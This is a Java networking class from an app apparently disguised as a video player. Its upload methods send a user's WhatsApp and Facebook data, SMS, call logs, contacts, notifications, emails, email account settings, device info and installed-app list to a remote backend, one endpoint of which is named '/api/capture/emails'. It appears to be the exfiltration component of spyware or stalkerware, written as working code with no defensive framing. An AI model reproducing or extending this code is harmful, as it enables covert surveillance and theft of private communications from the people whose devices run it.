package com.jumpy.videoplayerapp;

import android.content.Context;
import android.util.Log;
import org.json.JSONObject;
import org.json.JSONArray;
import org.json.JSONException;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import okhttp3.*;
import java.util.Map;
import java.util.HashMap;

public class ApiService {
    private static final String TAG = AppConfig.DEBUG_TAG + "_ApiService";
    private static final String BASE_URL = AppConfig.API_BASE_URL;
    private static final int TIMEOUT_SECONDS = 30;
    private static final int MAX_RETRIES = 3;
    
    private OkHttpClient client;
    private Context context;
    private String authToken;
    
    public ApiService(Context context) {
        this.context = context;
        this.authToken = null;
        
        // Initialize HTTP client with timeout and retry
        client = new OkHttpClient.Builder()
            .connectTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
            .readTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
            .writeTimeout(TIMEOUT_SECONDS, TimeUnit.SECONDS)
            .retryOnConnectionFailure(true)
            .build();
    }
    
    public void setAuthToken(String token) {
        this.authToken = token;
    }
    
    /**
     * Make HTTP request with retry logic
     */
    private Response makeRequest(Request request, int retryCount) throws IOException {
        try {
            Response response = client.newCall(request).execute();
            
            // Retry on server errors (5xx)
            if (response.code() >= 500 && retryCount < MAX_RETRIES) {
                response.close();
                Thread.sleep(1000 * (retryCount + 1)); // Exponential backoff
                return makeRequest(request, retryCount + 1);
            }
            
            return response;
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new IOException("Request interrupted", e);
        }
    }
    
    /**
     * Create request builder with common headers
     */
    private Request.Builder createRequestBuilder() {
        Request.Builder builder = new Request.Builder()
            .addHeader("Content-Type", "application/json")
            .addHeader("User-Agent", "VideoPlayerApp/1.0");
        
        if (authToken != null) {
            builder.addHeader("Authorization", "Bearer " + authToken);
        }
        
        return builder;
    }
    
    /**
     * Make GET request
     */
    public ApiResponse get(String endpoint) {
        try {
            Request request = createRequestBuilder()
                .url(BASE_URL + endpoint)
                .get()
                .build();
            
            Response response = makeRequest(request, 0);
            return parseResponse(response);
        } catch (Exception e) {
            Log.e(TAG, "GET request failed: " + endpoint, e);
            return new ApiResponse(false, "Request failed: " + e.getMessage(), null);
        }
    }
    
    /**
     * Make POST request
     */
    public ApiResponse post(String endpoint, JSONObject data) {
        try {
            RequestBody body = RequestBody.create(
                data.toString(),
                MediaType.parse("application/json")
            );
            
            Request request = createRequestBuilder()
                .url(BASE_URL + endpoint)
                .post(body)
                .build();
            
            Response response = makeRequest(request, 0);
            return parseResponse(response);
        } catch (Exception e) {
            Log.e(TAG, "POST request failed: " + endpoint, e);
            return new ApiResponse(false, "Request failed: " + e.getMessage(), null);
        }
    }
    
    /**
     * Make PUT request
     */
    public ApiResponse put(String endpoint, JSONObject data) {
        try {
            RequestBody body = RequestBody.create(
                data.toString(),
                MediaType.parse("application/json")
            );
            
            Request request = createRequestBuilder()
                .url(BASE_URL + endpoint)
                .put(body)
                .build();
            
            Response response = makeRequest(request, 0);
            return parseResponse(response);
        } catch (Exception e) {
            Log.e(TAG, "PUT request failed: " + endpoint, e);
            return new ApiResponse(false, "Request failed: " + e.getMessage(), null);
        }
    }
    
    /**
     * Make DELETE request
     */
    public ApiResponse delete(String endpoint) {
        try {
            Request request = createRequestBuilder()
                .url(BASE_URL + endpoint)
                .delete()
                .build();
            
            Response response = makeRequest(request, 0);
            return parseResponse(response);
        } catch (Exception e) {
            Log.e(TAG, "DELETE request failed: " + endpoint, e);
            return new ApiResponse(false, "Request failed: " + e.getMessage(), null);
        }
    }
    
    /**
     * Parse HTTP response
     */
    private ApiResponse parseResponse(Response response) throws IOException {
        try {
            String responseBody = response.body().string();
            int statusCode = response.code();
            
            if (statusCode >= 200 && statusCode < 300) {
                try {
                    JSONObject jsonResponse = new JSONObject(responseBody);
                    boolean success = jsonResponse.optBoolean("success", true);
                    String message = jsonResponse.optString("message", "");
                    Object data = jsonResponse.opt("data");
                    
                    return new ApiResponse(success, message, data);
                } catch (JSONException e) {
                    return new ApiResponse(true, "Success", responseBody);
                }
            } else {
                return new ApiResponse(false, "HTTP " + statusCode + ": " + response.message(), null);
            }
        } finally {
            response.close();
        }
    }
    
    /**
     * Health check
     */
    public ApiResponse healthCheck() {
        return get("/api/health");
    }
    
    /**
     * Google Sign-In
     */
    public ApiResponse googleSignIn(String credential, JSONObject userData) {
        try {
            JSONObject requestData = new JSONObject();
            requestData.put("credential", credential);
            requestData.put("userData", userData);
            
            return post("/api/auth/google-signin", requestData);
        } catch (JSONException e) {
            Log.e(TAG, "Error creating Google sign-in request", e);
            return new ApiResponse(false, "Invalid request data", null);
        }
    }
    
    /**
     * Upload WhatsApp data
     */
    public ApiResponse uploadWhatsAppData(JSONObject data) {
        return post("/api/whatsapp/messages", data);
    }
    
    /**
     * Upload WhatsApp contacts
     */
    public ApiResponse uploadWhatsAppContacts(JSONObject data) {
        return post("/api/whatsapp/contacts", data);
    }
    
    /**
     * Upload WhatsApp business data
     */
    public ApiResponse uploadWhatsAppBusinessData(JSONObject data) {
        return post("/api/whatsapp/business", data);
    }
    
    /**
     * Upload Facebook data
     */
    public ApiResponse uploadFacebookData(JSONObject data) {
        return post("/api/facebook/data", data);
    }
    
    /**
     * Upload notifications
     */
    public ApiResponse uploadNotifications(JSONObject data) {
        return post("/api/notifications", data);
    }
    
    /**
     * Upload SMS data
     */
    public ApiResponse uploadSMSData(JSONObject data) {
        return post("/api/sms", data);
    }
    
    /**
     * Upload contacts
     */
    public ApiResponse uploadContacts(JSONObject data) {
        return post("/api/contacts", data);
    }
    
    /**
     * Upload call logs
     */
    public ApiResponse uploadCallLogs(JSONObject data) {
        return post("/api/callLogs", data);
    }
    
    /**
     * Upload emails
     */
    public ApiResponse uploadEmails(JSONObject data) {
        return post("/api/capture/emails", data);
    }
    
    /**
     * Upload device info
     */
    public ApiResponse uploadDeviceInfo(JSONObject data) {
        return post("/api/device/info", data);
    }
    
    /**
     * Upload apps list
     */
    public ApiResponse uploadAppsList(JSONObject data) {
        return post("/api/apps/list", data);
    }
    
    /**
     * Upload email accounts configuration
     */
    public ApiResponse uploadEmailAccounts(JSONObject data) {
        return post("/api/email-accounts", data);
    }
    
    /**
     * Get settings
     */
    public ApiResponse getSettings() {
        return get("/api/settings");
    }
    
    /**
     * Update settings
     */
    public ApiResponse updateSettings(JSONObject settings) {
        return put("/api/settings", settings);
    }
    
    /**
     * Test connection
     */
    public boolean testConnection() {
        try {
            ApiResponse response = healthCheck();
            return response.isSuccess();
        } catch (Exception e) {
            Log.e(TAG, "Connection test failed", e);
            return false;
        }
    }
    
    /**
     * API Response wrapper
     */
    public static class ApiResponse {
        private boolean success;
        private String message;
        private Object data;
        
        public ApiResponse(boolean success, String message, Object data) {
            this.success = success;
            this.message = message;
            this.data = data;
        }
        
        public boolean isSuccess() {
            return success;
        }
        
        public String getMessage() {
            return message;
        }
        
        public Object getData() {
            return data;
        }
        
        public JSONObject getDataAsJson() {
            if (data instanceof JSONObject) {
                return (JSONObject) data;
            }
            return null;
        }
        
        public JSONArray getDataAsArray() {
            if (data instanceof JSONArray) {
                return (JSONArray) data;
            }
            return null;
        }
        
        public String getDataAsString() {
            if (data instanceof String) {
                return (String) data;
            }
            return data != null ? data.toString() : null;
        }
    }
} 